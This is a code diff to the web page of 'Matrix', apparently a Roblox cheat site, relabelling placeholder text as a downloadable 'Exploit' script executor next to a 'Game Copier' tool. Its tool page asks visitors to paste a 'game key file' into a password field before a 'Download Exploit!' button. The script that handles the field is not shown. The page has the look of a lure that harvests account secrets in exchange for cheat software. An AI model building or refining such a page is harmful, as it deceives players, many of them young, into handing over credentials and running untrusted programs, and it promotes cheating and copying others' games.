@@ -211,7 +211,7 @@ svg{display:block}
         <button class="secondary" onclick="go('how')">Learn More</button>
       </div>
       <div class="tags">
-        <span class="tag-button static-tag">Something1</span>
+        <span class="tag-button static-tag">Exploit</span>
         <span class="tag-button static-tag">Game Copier</span>
       </div>
     </div>
@@ -240,9 +240,9 @@ svg{display:block}
         <article class="card">
           <span class="card-label">Premium</span>
           <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 4.8 13.1h6.4L10.8 22 19.2 10.9h-6.4L13 2Z"/></svg></div>
-          <h3>Something2</h3>
-          <p>Download Something3 with instant access to premium and advanced features.</p>
-          <ul class="features"><li><span class="check">✓</span>Premium access</li><li><span class="check">✓</span>Instant availability</li><li><span class="check">✓</span>Advanced features</li></ul>
+          <h3>Exploit</h3>
+          <p>Download Matrix with instant access to premium scripts and advanced features.</p>
+          <ul class="features"><li><span class="check">✓</span>Premium scripts</li><li><span class="check">✓</span>Instant access</li><li><span class="check">✓</span>Advanced features</li></ul>
           <button class="tool-btn" onclick="openTool('a')">Use Tool <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg></button>
         </article>
         <article class="card">
@@ -274,7 +274,7 @@ svg{display:block}
         <div class="brand"><img class="brand-logo" src="favicon.png" alt="Matrix logo">Matrix</div>
         <p>Professional Roblox tools built for players who expect a faster, cleaner, and more polished experience.</p>
       </div>
-      <div><h4>Tools</h4><div class="footer-links"><button onclick="openTool('a')">Something4</button><button onclick="openTool('b')">Game Copier</button></div></div>
+      <div><h4>Tools</h4><div class="footer-links"><button onclick="openTool('a')">Exploit</button><button onclick="openTool('b')">Game Copier</button></div></div>
       <div><h4>Navigation</h4><div class="footer-links"><button onclick="go('home')">Home</button><button onclick="go('tools')">Tools</button><button onclick="go('how')">How It Works</button></div></div>
     </div>
     <div class="container footer-bottom"><span>© 2026 Matrix. All rights reserved.</span><span>Not affiliated with Roblox Corporation.</span></div>
@@ -284,15 +284,15 @@ svg{display:block}
 <section id="toolPage" class="tool-page">
   <div class="container">
     <button class="back-btn standalone-back" onclick="closeTool()">← Back</button>
-    <div class="tool-head"><h1 id="toolTitle">Something5 <span class="purple">Tool</span></h1><p id="toolSub">Access Something6 through a clean, focused interface.</p></div>
+    <div class="tool-head"><h1 id="toolTitle">Exploit <span class="purple">Tool</span></h1><p id="toolSub">Access Matrix through a clean, focused interface.</p></div>
     <div class="workspace">
       <article class="workspace-card">
         <div class="icon" id="toolIcon"></div>
-        <h2 id="workspaceTitle">Something7</h2>
-        <p id="workspaceDescription">Download Something8 — a polished Matrix tool with advanced features and instant access.</p>
+        <h2 id="workspaceTitle">Exploit</h2>
+        <p id="workspaceDescription">Download Matrix Executor — the most powerful Roblox script executor.</p>
         <input id="toolInput" class="tool-input" type="password" placeholder="Paste your game key file here" autocomplete="off">
         <p id="inputError" class="error" aria-hidden="true"></p>
-        <button id="actionButton" class="action-btn" onclick="submitTool()">Download Something9</button>
+        <button id="actionButton" class="action-btn" onclick="submitTool()">Download Exploit!</button>
       </article>
       <article class="workspace-card">
         <h2>How to Use</h2>
@@ -362,11 +362,11 @@ function openTool(tool){
   document.getElementById("inputError").classList.remove("visible");
 
   if(tool === "a"){
-    document.getElementById("toolTitle").innerHTML = 'Something5 <span class="purple">Tool</span>';
-    document.getElementById("toolSub").textContent = "Access Something6 through a clean, focused interface.";
-    document.getElementById("workspaceTitle").textContent = "Something7";
-    document.getElementById("workspaceDescription").textContent = "Download Something8 — a polished Matrix tool with advanced features and instant access.";
-    document.getElementById("actionButton").textContent = "Download Something9";
+    document.getElementById("toolTitle").innerHTML = 'Exploit <span class="purple">Tool</span>';
+    document.getElementById("toolSub").textContent = "Access Matrix through a clean, focused interface.";
+    document.getElementById("workspaceTitle").textContent = "Exploit";
+    document.getElementById("workspaceDescription").textContent = "Download Matrix Executor — the most powerful Roblox script executor.";
+    document.getElementById("actionButton").textContent = "Download Exploit!";
     document.getElementById("toolIcon").innerHTML = lightning();
   } else {
     document.getElementById("toolTitle").innerHTML = 'Copy <span class="purple">Games</span>';
